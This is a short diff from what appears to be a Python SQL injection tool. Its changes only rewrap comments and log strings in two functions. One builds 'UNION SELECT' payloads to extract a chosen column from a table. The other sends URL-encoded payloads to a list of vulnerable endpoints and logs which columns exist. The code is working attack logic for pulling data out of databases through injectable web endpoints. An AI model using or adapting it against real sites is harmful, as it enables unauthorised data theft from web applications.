@@ -19,9 +19,12 @@ def craft_exfil_pld(table, column, options: list):
     pld = "' UNION SELECT"
     # Traversing all columns and looking for indexes that can contain string
     for index in range(1, int(num_cols) + 1):
-        # Determine the column value based on whether it's the first index and if it can handle strings
-        column_value = column if (index == 1) else "NULL" if (str_index[index - 1] != index) else None
-        # Add appropriate values to the payload, avoiding repetition by using conditional expressions
+        # Determine the column value based on whether it's the first index
+        # and if it can handle strings
+        column_value = column if (index == 1) else "NULL" if (
+            str_index[index - 1] != index) else None
+        # Add appropriate values to the payload, avoiding repetition
+        # by using conditional expressions
         pld += f", {column_value}" if column_value is not None else ", NULL"
     pld += f" FROM {table}{db_comment}"
     return pld
@@ -35,8 +38,9 @@ def verify_table_column(url, table, column, options: list):
     for endp in vuln_endpoints:
         pld = requests.utils.quote(pld)
         r = requests.get(url=url + endp + pld)
-        log.logger.info(f"{BLUE}[*]{RESET} Trying to verify whether column +{column}+ "
-                        f"exists in table +{table}+ on endpoint {url + endp + pld}")
+        log.logger.info(f"{BLUE}[*]{RESET} Trying to verify whether column "
+                        f"+{column}+ exists in table +{table}+ "
+                        f"on endpoint {url + endp + pld}")
         if r.status_code == 200:
             log.logger.info(f"{GREEN}[+]{RESET} Column +{column}+ "
                             f"exists in table +{table}+, appending it")
